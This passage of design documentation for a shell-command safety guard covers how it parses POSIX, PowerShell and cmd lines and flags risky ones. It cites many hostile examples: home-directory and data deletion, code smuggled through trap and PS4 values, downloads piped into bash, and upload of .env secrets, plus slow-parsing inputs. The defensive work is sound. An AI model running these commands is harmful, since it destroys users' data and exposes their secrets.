# Shell

`milo-guards-shell` judges a shell line before it runs. It reads POSIX shells
(`sh`, `bash`, `zsh` and the ones that share their syntax), PowerShell and
Windows `cmd`.

```rust
classify(line, shell, &paths) -> Assessment
effect(line, shell, &paths) -> Effect
```

`shell` is a `Shell` (`Posix`, `PowerShell` or `Cmd`), which is
`#[non_exhaustive]`: a shell with a grammar of its own may be added, so a
caller's `match` on it needs a fallback arm. `paths` comes from
`Paths::new(cwd, home, workspaces)`.
The answer is `Safe`, or `Risky` with every finding: a rule, a reason a prompt
can show, and the argument it is about. The guard reads the line and never runs
it. It touches neither the file system nor the environment.

`effect` is a second answer from the same split: does the line only read? See
[Reads only](#reads-only). `explain` shows how a line was read, for a person
debugging a verdict: see [Explaining a line](#explaining-a-line).

The guard only reports. What to do about a finding is the caller's choice, and
nothing here knows about asking, refusing or modes. The types are core's; see
[Core](core.md).

## How it works

A line is judged in three steps.

1. **Split** the line into units, one for each program it runs.
2. **Detect**: rules read each unit and judge each path.
3. **Combine**: the line is safe only when no unit is risky. A risky line
   carries every finding.

The modules follow the steps. `posix`, `powershell` and `cmd` split a line with
their grammar. `launch` takes wrappers off and reads scripts handed to shells.
`unit` holds the unit and the helpers that read its arguments. `detect` holds
the rules. `values` keeps what a POSIX line sets its variables to, for the
places bash reads a value again as code. `path` is the shell's side of the
path model. `inline` finds the code
an interpreter is given inline and turns what `milo-guards-code` reads in it into
units (see [Inline code](#inline-code) and [Code](code.md)).

## Splitting

The line is split with the grammar of the shell that runs it. The caller says
which shell, with `Shell::Posix`, `Shell::PowerShell` or `Shell::Cmd`.
`Shell::for_program` maps a name such as `/bin/zsh` or `pwsh.exe` to one. The
parsers are tree-sitter's bash, PowerShell and batch grammars.

- Chains (`&&`, `||`, `;`), pipes, substitutions (`$(...)`), loops, blocks and
  subshells are walked.
- **Every branch counts**, whether or not it would run. `false && rm -rf ~` is
  risky.
- Where a grammar reads a line differently from the shell, the shell wins.
  A POSIX line's backslash-newlines are joined first, so `r\<newline>m` is
  `rm`. cmd's built-ins also split arguments at `,`, `;` and `=`. PowerShell's
  stop-parsing token `--%` hands the rest of the line up to a `|` or the end
  of the line to the program as written, and the program splits it by its own
  rules: by the C runtime's (white space between words, double quotes around
  one, `\"` a quote, backslashes before a quote halved), or, for `cmd`, not
  at all, as it runs the text as it is (`git --% push --force` is
  `git_remote`, `cmd /c --% rd /s /q C:\Users\me` a `delete`); a `>` there is
  the program's argument, a typographic quote is no quote, and `%NAME%` is the
  environment variable, a known place (`%USERPROFILE%`) or only known when it
  runs. When the command after cmd's `/c`, `/k` or `/r` starts with a quote,
  cmd drops the first and the last quote of it unless `/s` came before, there
  are just two, white space and none of `&<>()@^|` is between them, and what
  is between them is a program it finds; whether it finds one is not known
  here, so then both readings are judged (`cmd /c --% "rd /s /q C:\Users\me"`
  is a `delete`). What follows a `|` after `--%` is read as a script of its
  own, not as the next stage of the pipeline. PowerShell does not hand a
  native program an unquoted `$null` at all, nor an empty `$()` or `@()`, nor
  what a pipeline that ends in `Out-Null` gives, so the arguments after it
  move up (`git $null push --force` and `git (Out-Null) push --force` are
  `git push --force`); a cmdlet (a name of an approved verb, a dash and a
  noun, or a built-in `-Object` cmdlet) binds it, and `'$null'` is a file of
  that name. PowerShell reads a space that is not an ASCII one (U+0085, U+00A0,
  U+1680, U+2000 to U+200A, U+2028, U+2029, U+202F, U+205F, U+3000) as a
  space, a typographic quote (U+2018 to U+201B, U+201C to U+201E) as a quote
  and an en dash, em dash or horizontal bar at the start of a word as `-`,
  which its grammar does not, so a line, and each script it runs, is written
  with the ASCII ones before it is parsed (`Remove-Item<U+00A0>C:\Windows
  -Recurse` is a `delete`, `iex –Command $x` is `unknown`); inside a string
  they are the text it holds, as they are after a backtick, in a comment and
  after `--%`, but a `$( … )` in a double-quoted string or a `@" … "@`
  here-string is code again. A here-string opens only at the start of a word
  with nothing after its marker on the line (`ssh me@"host"` is a word with a
  string in it).
  PowerShell's grammar knows `>`, `>>`, `2>` to `6>`, `*>`
  and their doubled forms as redirects, but lexes `1>`, `7>` and a `>` glued
  to its word (`echo x>f`, `echo x 1>f`) as words; the guard reads each as the
  redirect it is, with the stream number dropped, and the file glued to it or
  the next argument as the file it writes (`echo x 1> ..\x.txt` is an
  `overwrite`); a word glued to the `>` that the grammar lexes as a
  parameter (`git log --format=%h>..\x.txt`) is read the same way, with the
  part before the `>` kept as the parameter. A `1>` followed by a parameter
  (`git reset 1> --hard`) is `unknown`: the guard keeps the parameter an
  argument and cannot tell whether it is the file. PowerShell reads `$HOME\.ssh\id` as one word but its
  grammar fails at the backslash, so such a word is put in quotes first. A cmd
  "comment" that hides a command cannot be read.
- Fish has no grammar here. Its line is read as POSIX, which is still safe:
  what the grammar cannot parse comes back risky.
- The bash grammar reads every word after the operator of a redirect as one
  more file (`rm 2>/dev/null -rf ~`, `command >out rm -rf ~`) and the shell
  only the first: the rest are arguments of the command, after the ones
  written before the redirect, so the line is read as `rm -rf ~`. The same
  for the words after a here-document's delimiter on the line it starts
  (`rm <<EOF -rf ~`) and a redirect the grammar holds inside a
  here-document's (`cat <<EOF > out -n`). On a list, a pipeline or a
  negation they are the last command's, as the redirect is. A group, a loop,
  a subshell or a function takes no arguments, and the shell refuses such a
  line (`{ ls; } > out rm -rf ~`): it is `unreadable`, `has words after a
  redirect that cannot be read`. So is a declaration (`export`, `declare`,
  `local`, `readonly`, `typeset`) or an `unset` with words after the file of
  its redirect (`export 2>/dev/null FOO=1`): the shell runs it, but the
  grammar reads it as no plain command, and the guard does not give it the
  words back. A `{NAME}` stuck to a redirect operator (`exec {fd}>out`,
  `exec {fd}>&-`) is where bash puts the descriptor it opens, not an
  argument.

### Wrappers and scripts

Wrappers come off: `sudo`, `env`, `nice`, `timeout`, `xargs`, `find -exec`,
`Start-Process`, `start`. `sudo rm` is `rm`, run as root. `Start-Process`
reads its parameters as the cmdlet does: each that takes a value takes the
next argument whatever it is (`-WindowStyle Hidden`, `-Credential`,
`-WorkingDirectory`, `-Verb`, `-RedirectStandardInput`, `-ArgumentList
'-c x'`), so none is left where the program is read; the strings of
`-ArgumentList` are joined into one command line that the program splits as
it does after `--%` (`Start-Process psql -ArgumentList '-c "DROP TABLE t"'`
is `drop_data`); and `-RedirectStandardOutput` and `-RedirectStandardError`
write their file, as a redirect does. So do the words that
run the command after them in a POSIX shell: `command`, `builtin`, zsh's
precommand modifiers `noglob`, `nocorrect` and `-` (they take no options, so
`noglob -- rm` runs a program named `--`), and `coproc`.

`Start-Process` joins its argument list (`-ArgumentList`, `-Args`, or the
words after the program) with spaces into one command line, which the program
splits as Windows programs do: spaces separate words outside `"…"`, `""` in a
quote is a quote, and backslashes count only before a `"`. So
`-ArgumentList '-c "DROP TABLE t"'` hands `psql` the two words `-c` and
`DROP TABLE t`. The words no longer show that a value was quoted, so the word
after `-ArgumentList` is its value whatever it starts with, and a word that
starts with `-` and holds a space is the list given by position (`Start-Process
psql '-c …'`), not a parameter. A literal array of strings
(`-ArgumentList @('-c', 'DROP TABLE t')`) is its items, as a comma list is;
`-RedirectStandardInput FILE` (`-RSI`) is a redirect of the file onto the
program's input, as `psql < FILE` is, and the file of each redirect is not an
argument of the program.

**Package runners** come off too, with each runner's own options skipped:
`npx`, `npm exec`, `pnpm dlx` (also `pnpx` and `pnx`, its aliases), `pnpm exec`,
`yarn dlx`, `yarn exec`, `bunx`, `bun x`, `deno x`, `dx`, `uvx`, `uv tool run`, `uv run`, `pipx run`. The
program the runner names is judged, with a version after the package taken
off (`npx rimraf@5`). Where the runner names the package apart from the
program (`npx -p pkg prog`, `uvx --from pkg prog`) the program is the one
after the options. An option that takes a value is skipped with it, because
one that is missed would turn its value into the program, so each table is
the runner's own list and not a guess: npm's is every setting of its config
definitions that is not a boolean with its shorthands (`npm -C dir`, `npx
--editor vim`, `npm exec --logs-dir x`), read as npm reads them (an
unambiguous start of a name is the option, `--ed vim`; `npm exec` takes a
`true` or `false` after a boolean; `npx` first puts its own `--` before the
program, so a word it took for a value that npm did not is the program);
pnpm's is its own string and number settings, `exec`'s `--resume-from`,
`dlx`'s `--allow-build` and npm's settings, which it reads too; yarn's is
the options of `yarn --help` that name a folder, a host, a number or a type;
bun's is the `--option=<val>` options of `bun --help` that also take the next
word (not `-c`, `--config` and `--inspect`, whose value only follows `=`);
bun itself takes the first word that does not start with a dash as its
subcommand, before any option reads a value (`bun -c rimraf a` runs `rimraf`,
`bun -F x echo` runs `bunx echo`, `bun --title repl` opens the REPL), so that
word is read too, and when it is `x`, `run`, `exec`, `repl` or a delete tool
both readings are judged and the riskier one counts (the two share the wrappers a line may have and at most 32 such forks are made in a line, past which it is unreadable, so a line that forks at every `bun` is too wrapped like any other, not slow); deno's is its option definitions that take one value; uv's is `uv run --help` and the hidden
options real uv still takes a value for (`--python-preference`,
`--python-fetch`, `--max-recursion-depth`); pipx's is `pipx run --help`
(`--fetch-missing-python` is a flag). `npm exec` and `npm x` take the first
`--` for themselves, before the program or after it (`npm exec sh -- -c
'cmd'` runs `sh -c 'cmd'`); `npx` hands it on. `npx -c`, `npm exec -c` and
`pnpm -c exec` (the option may stand before `exec` too) run a shell command,
and so does `yarn exec`, whose arguments are a script. npm's `-c` is found as
npm reads it, among every option before the program, also before `exec`: at
the end of a bundle (`npx -yc 'cmd'`), spelt `--c`, given its value after `=`
(`npx -c='cmd'`), or put before the subcommand (`npm -c 'cmd' exec`). A bundle
of any length is read to its end, never given up on as the program. Each is
read as a script: in cmd where the line is for Windows (npm and pnpm start the system
shell there, and PowerShell's own grammar does not apply), in POSIX otherwise.
`yarn` (also `yarn run`) and `bun` (also `bun run`) start a delete tool by its
name (`yarn run rimraf dist`). `pnpm NAME` runs the script NAME of the project
and, with none by that name, the program (pnpm: "will execute the command as a
shell script"), so it is read as `pnpm exec NAME` unless NAME is a command of
pnpm, its alias, or an npm command it passes on (`pnpm rm lodash` removes a
dependency): `recursive`, `multi` and `m` are pnpm's own spellings of `-r`, so
`pnpm recursive exec rm -rf ~` is read as `pnpm -r exec rm -rf ~`; `pnpm sh -c 'rm -rf ~'` and `pnpm find ~ -delete` are read like
the program, `pnpm rimraf dist` is a delete tool, and an unknown script name
(`pnpm lint`, `pnpm dev`, `pnpm build`) is safe. `bun run name`
also starts any program on the path when it is no script (`bun run rm -rf
x` deletes): a word after `bun run` and its options that is no file (no
folder in it, no extension) is judged as the program, so `bun run build` is
safe as an unknown name and `bun run sh -c 'rm -rf ~'` is read like `sh -c`.
Bare `bun name` runs only scripts and bins of the project, so only a delete
tool is read there. The delete tools that come as packages (`rimraf`, `del`
and `del-cli`, `premove`, `rmrf`) delete their operands, judged as `rm` judges them: `bunx rimraf /` and `pnpm dlx rimraf ~`
are `Delete`, `npx rimraf dist` is safe. Only `del` and `del-cli` have a dry
run, and only `--dry-run` is read as one: `del -n ~` deletes as far as the
guard knows. What a runner starts is a program, never a builtin of the shell,
so `npx cd src` does not move the rest of the line to `src`.

`bun` and `deno` are interpreters. The code given to `bun -e`, `--eval`, `-p`,
`--print` (also in a bundle, `bun -pe 'code'`, or with the code attached, `bun
-e'code'`) and `deno eval` is read and judged like the code of `node -e` (see
[Inline code](#inline-code)); in cmd and PowerShell lines it is not read, and
comes back as `Unknown`. `bun repl`, `deno repl`, a bare `deno` and a script
read from the input (`bun run -`, `deno run -`, `uv run -`) run code the guard
does not read: `Unknown`, or `RunDownloaded` after a download; in cmd and
PowerShell lines a REPL reads its input only when something is piped into it
(`echo x | deno`), and in cmd lines so does a script read from the input
(`type x.js | bun run -`). The options before the
subcommand are skipped with their values (`bun -d x:1 -e 'code'` is still
inline code). `bun exec 'script'` runs a shell script, read as POSIX like `sh
-c`. `bun run file`, `deno run file` and `bun file` are judged like `node
file`, so a script the same line writes is not read, also after options (`bun
--hot run file`) and after deno's `watch`, which is `run --hmr`. So is `uv run
file.py`, and `uv run --script file`: `uv` runs Python on the file, like
`python file`. `deno run npm:pkg` runs the package's program like a runner,
and so do `deno watch npm:pkg` and `deno npm:pkg`: deno's default subcommand
is `run`. `deno x` and `dx` are package runners, like `bun x`. In cmd lines
these runner parts of `bun`, `deno` and `dx` are read as in the other shells
(`bun x rimraf C:\`, `bun run rimraf C:\`, `deno run npm:rimraf C:\`,
`dx rimraf C:\`); what they read of an interpreter (a script from the input
that nothing is piped into, `bun exec`) is not, and inline code is `Unknown`
there, also when the code cannot be told (a loader in front of `-e`, as in
`bun --import r.js -e "$X"`). `deno -v` and `deno --help=full` only
print. The options of `deno` that take their value
only after `=` (`--reload`, `--env-file`) do not take the next word.

`coproc` is read as the shells read it. A simple command takes no name, so the
first word is the program (`coproc NAME cat` runs `NAME`); a group may take
one (`coproc NAME { … }`). The program is the first word past the name, the
`{` words that open the group (`coproc { { rm -rf ~; }; }` is read through
both), `NAME=value` words and `!`, as it is without `coproc`: `coproc FOO=1 rm
-rf ~`, `coproc { ! rm -rf ~; }` and `coproc NAME { FOO=1 rm -rf ~; }` judge
the `rm`. A redirect in front of the command gives the command its words
back, as any redirect does (see [Splitting](#splitting)): `coproc { 2>/dev/null
rm -rf ~; }` and `coproc > out rm -rf ~` are `Delete`. The grammar has no
`coproc`, so two forms are not read, and are risky:

- A loop, conditional, `case` or function after it, or inside its group
  (`coproc while …; do …; done`, `coproc NAME { for …; do …; done; }`), is cut
  into pieces whose body hides behind the program `do`: `Unreadable`.
- A `{` stuck to a word (`coproc {rm -rf ~;}`): zsh runs it as a group, the
  grammar reads `{rm` as a program of that name: `Unreadable`.

The other words that start a command of their own are read the same way,
since the grammar does not read a group or a negation after them either.
bash's and zsh's `time` (after its `-p`) runs the command after it, past `{`,
`!` and `NAME=value` words: `time { rm -rf ~; }`, `time ! rm -rf ~` and
`time FOO=1 rm -rf ~` judge the `rm`. After `!` the grammar reads a group's
`{` as a program; wherever `{` or `!` is a program, the command after it is
what runs: `! { rm -rf ~; }` is `Delete`. zsh's `repeat
N` runs the command or group after its count (`repeat 3 rm -rf ~`, `repeat 3 {
rm -rf ~; }`), or the list after `do` (`repeat 3 do rm -rf ~; done`). A loop,
a conditional or a function after any of them (`time for …`, `! while …`), and
a `{` stuck to a word (`time {rm -rf ~;}`, `! {rm -rf ~;}`), are cut up by the
grammar as after `coproc`, and are `Unreadable`: a program named `while`, `if`,
`for` or any of the words that open such a command, and one that starts with a
`{`, is read so wherever it stands. So is a program named `do`, `then`, `elif`
or `else`, the body of a loop or a conditional the grammar cut off from the
words that open it: zsh skips the separators after `repeat`'s count, so
`repeat 3; do rm -rf ~; done`, on one line or on three, runs the `rm` three
times, and the grammar reads `repeat 3` and a program named `do`.

The program after a wrapper is the word the shell makes of it. A brace list
(`command {rm,-rf,~}`, `r{m,x} -rf ~`) or a sequence expression (`r{m..m} -rf
~`, `{1..3}`, `{a..c}`, `{1..9..2}`) is spelt out into words, the first of
which is the program: `Unreadable`, `runs a program a brace list names, which
cannot be read`, behind a wrapper or not (`{rm,-rf,~}` alone is a line the
grammar cannot parse). The check reads the word as the shell has it after
quotes are taken out, so a quoted list (`'{rm,-rf,~}'`), which the shell does
not spell out, is `Unreadable` too. A word with an unquoted wildcard (`./* -rf
/`, `?? -rf /`, `[r]m`) names the first file it matches, so the program is
only known when it runs: `Unknown`, as for `$CMD`. A quoted one (`'*' -h`) is
the name as written; behind a wrapper (`env ./* -rf /`) the guard no longer
knows whether the word was quoted, and reads a wildcard as one either way,
also behind zsh's `noglob` (`noglob ./*`), which keeps the shell from
expanding it. A `[` alone is a name, as the program `[` is.

A script handed to a shell is split again, in its own grammar: `bash -c`,
`eval`, `cmd /c`, `powershell -Command`, `Invoke-Expression`. So is the value
of each `NAME=VALUE` a POSIX `alias` defines: what a call of the name runs,
read where it is defined, as a function's body is. A nested script
counts as far as a depth limit, and the text of all the nested scripts read
for one line as far as a budget a few times the longest line. Past either, the
line is unreadable.

The other limits, each read as unreadable past it, and each pinned by a test
that finds the edge by measuring it and asserts both sides (see Tests):

| Limit | Value | What it bounds |
| --- | --- | --- |
| Line length | 64 KiB | text parsed at all |
| Parse tree depth | 400 levels | the walk, so the stack |
| Shells in shells | 8 | `bash -c "sh -c '…'"` |
| Wrappers in front of a program | 15 | `sudo env nice … rm` |
| `find` inside `find -exec` | 16 | the walk, so the stack |
| `find -exec` work | 1 MiB | each level runs its program once per place it searches, so levels multiply; counted in the bytes built to hand on, `{}` replaced, because a count of arguments misses one that holds thousands of `{}` |
| Opening `(` with none closed | 400 | counted before parsing, blind to quoting; only `(` is counted, not `{` or `[`: cmd's grammar takes time that grows with the square of the depth |
| `&`, and `|`, in cmd | 400 of each (`&&` and `||` once) | counted before parsing: cmd's grammar nests a chain a level for each, so past the parse tree depth the line is unreadable anyway, and for `&` it takes time that grows with the square of the chain to find that out (a chain of 7,280 commands took 1.6 s on one machine and 2.5 s on another) |
| Here-documents started on one line (POSIX) | 256 | counted before parsing: bash's grammar holds each until the line ends (a backslash continues it) and takes time that grows with the square of how many; here-strings are not counted, and nor are here-documents that follow a command on lines of their own (`cat <<A\n` repeated costs the text and no more); with no command before the `<<` the grammar is slow, see the noise below |

The grammars themselves take time that grows with the square of the line on
some noise that none of the counts above covers. Measured in a release build
at 65,000 bytes (the longest line), in POSIX: `)` repeated takes about 10 s, `)a`
repeated (32,000 times, so not only a run of one character) about 9 s, `a|`
repeated 19.7 s, `|` or `>` repeated 4 to 5 s, and `<` repeated 3 s; here-documents
with no command before the `<<`, which the count above does not reach because
each is closed or on a line of its own: `<<A\nA\n` repeated 3.6 s, `<<A;\n`
4.0 s, `<<A\n` 4.9 s, and `<<A;` sixteen to a line (under the count) 5.4 s (`cat <<A\n` repeated
takes 1 ms, so the cost is in the missing command); in PowerShell, `echo ` then
`${` repeated 17 s, and `"${` repeated 3.5 s; in cmd, `@` repeated about 10 s.
Another machine took twice as long (20 s for `)` and for cmd's `@`, 9.5 s for
`|` and `>`, 6.7 s for `<`, 19 s for `)a`). A debug build is about three times
slower (29 s for `)`). cmd's `&` and `|` are counted above. A real line
never has them, and they come back risky, so the guard is slow there, never
wrong.

The open-`(` count does not catch brackets that close. Balanced ones take
time too, measured in a release build at 64 KiB on the same branch: in POSIX,
`()` repeated 9.0 s and `f() ` repeated 1.1 s; in cmd, `(echo) ` repeated
5.2 s, and `echo ` then `$((1<<2)); echo ` repeated 3.2 s. These are examples
of what was measured, not every slow shape: a new measurement can find
another, and the list is not a promise that anything else is fast.

### Actions that run later

Some commands only register a script, which runs when something happens
rather than now. The script is read where it is written, in its own grammar,
and its findings are the line's, since the shell runs it as the same user.

- **`trap`** in a POSIX shell: `trap 'ACTION' SIGNAL…`, also `trap -- 'ACTION'
  …`, whichever signal (`EXIT`, `0`, `INT`, `TERM`, `ERR`, `DEBUG`, `RETURN`,
  `HUP`, a number, several at once). The action is read like an `eval`'s
  script: `trap 'rm -rf ~' EXIT` deletes the home directory. A double-quoted
  action is expanded when the trap is set and its result read as code when it
  runs, as `eval "…"` is, so whatever an expansion holds becomes code: `trap
  "echo $d" EXIT` is `unknown`, with the reason `runs a script only known when
  it runs`, like `eval "$x"`, and so is `trap "$x" EXIT`. The text around the
  expansions is still read, so `trap "rm -rf $d" EXIT` also carries the
  `delete` of `$d`, a path known only when it runs. `$HOME`, `$PWD` and
  `$TMPDIR` are the places the guard names and are not counted as
  expansions. A single-quoted action is not expanded when set and is read as
  written: `trap 'rm -f "$tmp"' EXIT` is `rm -f "$tmp"`, and `trap 'echo $d'
  EXIT` is safe.
- **Nothing runs** for `trap - EXIT` and `trap -- - INT` (put the default
  back), `trap '' INT` (ignore the signal), `trap -p`, `trap -l` and a bare
  `trap`.
- **PowerShell**: the block of `trap { … }`, and the block given with
  `-Action` to `Register-EngineEvent`, `Register-ObjectEvent`,
  `Register-WmiEvent` and `Register-CimIndicationEvent`. The grammar reads a
  block in place, so its commands are judged as if they stood on the line,
  and an action that is not a block written out is a script known only when
  it runs, which is `unknown`: `-Action $block`, `-Action ([scriptblock]::Create($t))`,
  an action given by position (`Register-EngineEvent X $block`) and any splat
  (`Register-EngineEvent @p`). By position, the action is the last of the
  parameters the command's names leave to be given by position, in the docs'
  order: source then action for `Register-EngineEvent`; object, event, source
  then action for `Register-ObjectEvent`; class or query, source then action
  for `Register-WmiEvent` and `Register-CimIndicationEvent`.
  `Register-ObjectEvent $timer Elapsed`, with no action, is safe. The
  `-Action` block of `Set-PSBreakpoint`, which runs when the breakpoint is
  hit, and a block set as a hook of `$ExecutionContext.InvokeCommand`
  (`CommandNotFoundAction`, `PreCommandLookupAction`,
  `PostCommandLookupAction`, `LocationChangedAction`, by assignment or by
  its `set_` method), which runs when a command is looked up or the location
  changes, run later the same way.
- cmd has nothing like it.
- **`PS4` and `BASH_ENV`** in a POSIX shell. bash expands the value of `PS4`
  (with `$(…)`, backticks and `$((…))`) every time `set -x` prints a trace
  line, and the value of `BASH_ENV` once when a non-interactive bash starts,
  then runs the file it names; other shells differ, but every shell is
  judged as bash. An assignment counts as a statement
  (`PS4=…`, also `+=`, and `PS4[0]=…`: only a subscript of at most 18
  digits that is not all zeros is another element; any other may be the
  first element, which is the value, and a longer number wraps round to it,
  as bash keeps a subscript in 64 bits: `PS4[18446744073709551616]` is
  `PS4[0]`), after `export`,
  `declare`, `typeset` and the like (also quoted, `export "PS4=…"`, and
  behind `builtin` and `command`: `builtin export PS4=…`; `command -v
  export PS4=…` only says what `export` is and sets nothing), in front of a
  command (`PS4=… bash -x s.sh`) and as a word of `env` (`env PS4=… cmd`, also through `sudo` and the
  other wrappers). A value with code in it, `$(` or a backtick, is read as the
  script it is, as an action that runs later (see below), so `PS4='$(rm -rf
  ~)'; set -x; true` is the `delete` of `~`: the text around the code is
  not run, only what is in it. The code is read as written, with its own
  quotes and backslashes (`PS4='$(rm -rf "$HOME")'`); only the text around
  it is quoted. Where the code ends is found by reading its quotes, `${…}`,
  nested `$(…)` and backticks, and a value that does not end, or whose code
  holds a here-document, a comment, a `case` or a funsub (where a `)` or a
  line may not be the code's own), is `unreadable`. A funsub, `${ cmd; }` or `${| cmd; }`
  (`${` and a blank, a newline or `|`), is code too, and comes out
  `unreadable` as it does anywhere else. bash decodes the prompt's escapes
  before it expands the value, so `PS4='\044(rm -rf ~)'` and `PS4='\140rm -rf
  ~\140'` are the `$(` and the backticks they spell, and a `PS4` is read
  with each `\N`, `\NN` and `\NNN` of one to three octal digits decoded, as
  newer bash does (`PS4='\44(rm -rf ~)'` is the `$(` too; `\033[1m` colours stay
  text, and `\0` is nothing). bash 3.2, the `/bin/bash` of a Mac, decodes
  only three-digit escapes (`\44(` prints as written), so the code is found
  under both readings, the one that decodes more. `\[` and `\]` are read as
  nothing, so `PS4='$\[\](rm -rf ~)'` is the `delete` of `~`. `\$` is read
  as `$`: bash 3.2 keeps it as an escaped `$`, which starts no code by itself
  (`PS4='\$(rm -rf ~)'` runs nothing there), but the guard does not rely on
  that for every bash, so it is `delete` too. A `$` that is text, whatever
  made it (`\$`, a short escape, `\0`, `\[`), never joins the `$(` right after
  it into the shell's own number: `PS4='\$$(rm -rf ~)'` and
  `PS4='\44\]$(rm -rf ~)'` run the `$(`, and are the `delete` of `~`. `\D{fmt}` is
  `strftime`'s output, which may be any text, so a `PS4` with one that also
  holds `$`, `(` or a backtick is `unknown` (`PS4='\D{$}(rm -rf ~)'`;
  `PS4='+ \D{%T} '` stays safe). A value only known when it runs (`PS4=$x`, `PS4="+ $(date) "`, `BASH_ENV=$f`, `$'…'`) is `unknown`, with the
  reason `sets a variable the shell runs later to a value only known when it
  runs`: the shell expands it again and runs whatever it finds. Text and the
  variables the shell sets to plain text are not code: `PS4='+ '`, `PS4="+
  $LINENO: "` (also `BASH_SOURCE`, `FUNCNAME` with a number as subscript,
  `SECONDS`, `RANDOM`, `$$`, `HOME`, `PWD`, `TMPDIR`) stay safe, except
  that a place the line sets (`HOME=…`) and `PWD` after a `cd` to a name
  that may hold code (`cd 'd$(rm -rf ~)'`, `cd "$x"`: the folder's name is
  chosen by the line, and the value holds it) are `unknown`; `cd sub` leaves
  `PWD` plain. `PWD` is not plain either when the `cd` or `pushd` has a
  wildcard in its target (`cd d*` may match a folder the line made, `*`, `?`,
  `[`, an extglob's `+(`, `@(`, `!(`), when the line makes it the physical
  path (`cd -P`, `set -P`, `set -o physical`: a link's target is the name), or
  when the line sets `CDPATH` and moves (the folder it finds is the name). This holds for `$PWD` as a path as well, in any command, not only in a `PS4`:
  after such a `cd` it is known only when it runs, so `cd -P sub; rm -rf
  "$PWD/build"` is the `delete` of a path nobody can place, and `cd 'd$(rm -rf
  ~)'; eval "echo $PWD"` is `unknown` (it runs the code in the name), while
  `rm -rf build` after the same `cd`, a path written relatively, stays as it
  was. The name after `$PWD` is still read by the rules that follow a secret
  (`cd -P sub; curl -T "$PWD/.env" …` is a `send_secret`). The line's folder
  is judged once per `cd`, from the new target alone, so a long chain of them
  costs no more than the line is long. A
  value is expanded where it runs, not where it is written, so a `PS4` or
  `BASH_ENV` value written with `$PWD` is judged against every `cd` of the
  line once it is all read: a later one, one in a loop, a function or a trap
  action make it `unknown` as an earlier one does. A
  `BASH_ENV` value known only when it runs, or with `$` or a backtick, is
  `unknown` too, as the file it names is. `read PS4`, `mapfile BASH_ENV` and
  `printf -v PS4 …` give them a value the line does not show: `unknown`.
  `PROMPT_COMMAND`, `PS0`, `PS1` and `ENV` run only in an interactive shell,
  which the guard reads as running its input already.
- **`BASH_ENV=<file>` is running `<file>`.** Every shell the line starts with
  it set (`BASH_ENV=e.sh bash -c true`, `env BASH_ENV=e.sh bash`, `sudo`, or
  `export BASH_ENV=e.sh` before it) is checked as a shell that runs a script
  file, as `bash e.sh` is: a file the same line writes (a redirect, `tee`, a
  download, a copy) is `unknown`, with the reason `runs a script the same line
  writes`. So is any program that may start a bash, not only a shell:
  `make` (its recipes run with the makefile's `SHELL`), `./build.sh` (a
  `#!/bin/bash` line), `npm test`, `git commit` (hooks), a program only known
  when it runs, and a shell reached through `find -exec`, `npx` and the
  other wrappers. A builtin that starts nothing (`echo`, `printf`, `true`,
  `:`, `cd`, `export`, `pwd`, `test`, `read`, `declare` and the like) does
  not run it, but a `BASH_ENV` in front of a special builtin (`:`, `.`,
  `break`, `continue`, `eval`, `exec`, `exit`, `export`, `readonly`,
  `return`, `set`, `shift`, `times`, `trap`, `unset`) stays set after it, and
  is exported: in POSIX mode, and for an `EXIT` or `RETURN` trap. It is read
  as a statement of its own line, as `BASH_ENV=e.sh; bash -c true` is, so
  `BASH_ENV=e.sh :; bash -c true` runs `e.sh` when the line writes it; in
  front of `true` or `echo`, which are not special, it is gone after the
  command. A file the line does not write is not read, as for `bash
  e.sh`. A `BASH_ENV` that names standard input (`/dev/stdin`, `/dev/fd/0`,
  `/proc/self/fd/0`) makes that shell read its input as a script, as `bash
  /dev/stdin` does: `curl … | BASH_ENV=/dev/stdin bash -c true` is
  `RunDownloaded` and `BASH_ENV=/dev/stdin bash -c true < x.sh` is
  `RunInput`. A file the line sets with `export` or as a statement is
  checked against every shell the line starts, wherever it sits (a trap
  action, an earlier pass of a loop, a function body, a command before the
  assignment), as the files the line writes are, whatever the order. A name written out (`BASH_ENV=e.sh`) is the child's to resolve, so
  after a `cd` it is read from the folder the shell runs in; one an
  expansion made (`BASH_ENV=$PWD/e.sh`) was resolved where the assignment
  ran, so it is checked from there too. A line sets at most 16 different
  files (the same one again counts once); one more makes the line `unknown`,
  with the reason `sets BASH_ENV to more files than the guard reads`. Not
  read: `${PS4:=…}`, a `for PS4 in …` loop and a nameref to either variable.

The action runs in this shell, later: after the line's last command, or
between its commands (`DEBUG`, `ERR`, `RETURN`, a signal). It is judged as the
line leaves things, whichever is more conservative and needs the least state:

- **Where it runs.** Its relative paths are judged from where the line was
  at the `trap`. A `cd` (or `pushd`, `popd`, `Set-Location`) after it, anywhere
  in the line, makes those paths known only when it runs: `trap 'rm -rf
  build' EXIT; cd ~` deletes a path known only when it runs. A `cd` inside
  the action may run before the next command, so the rest of the line is read
  from somewhere unknown too. An absolute path or `~` is the same wherever the
  line has moved. A `cd` in a subshell, `$(…)` or a script in a process of
  its own is not a move of this shell, as it is not for any later path, so
  `trap 'rm -f lock' EXIT; (cd sub && make)` still runs `rm -f lock` from
  where it was set. `eval` runs in this shell, so its `cd` is a move.
  The exception is a trap a subshell copies: `ERR` and `DEBUG` (zsh also
  `ZERR`) in zsh, `ERR` with `set -E` and `DEBUG` and `RETURN` with `set -T` in
  bash, also in `$(…)`. It runs from where the subshell has moved to as
  well, so for these (and for a signal the guard does not know, or one known
  only when it runs) any `cd` after the `trap` counts, subshell or not:
  `trap 'rm -rf build' DEBUG; (cd /; true)` is a delete of a path known only
  when it runs. `EXIT` and the ordinary signals are reset in a subshell and
  keep the rule above.
- **Names in a finding.** A double-quoted action is read from its text with
  each expansion replaced by a placeholder variable; a finding about it names
  the action as written, never the placeholder.
- **Hidden names.** The action is a body (see Bodies below): when the line
  turns `dotglob` on anywhere, even after the `trap`, its wildcards match
  hidden names. An off switch inside it changes nothing for the rest of the
  line, and an on switch inside it stays on.
- **Nesting.** A `trap` inside a script, a `bash -c` or another `trap` counts
  as far as the depth limit. A `$(…)` in a double-quoted action is read where
  it stands, when the trap is set, and is a placeholder variable in the text
  the action is read from, so it is not read twice.

### Values read again as code

bash reads some values a second time, and runs the code it finds in them
then: a variable's value is code where it is read so, not where it is set.

- **Arithmetic** reads a variable's value as an expression, and a subscript
  in that expression is expanded, `$(…)` and all: `x='a[$(rm -rf ~)]'; echo
  $((x))` deletes the home directory. The places that read arithmetic are
  `$((…))` and `$[…]` (also in the body of an unquoted here-document, where
  the grammar reads `$((x))` as a command), `((…))`, the three parts of `for
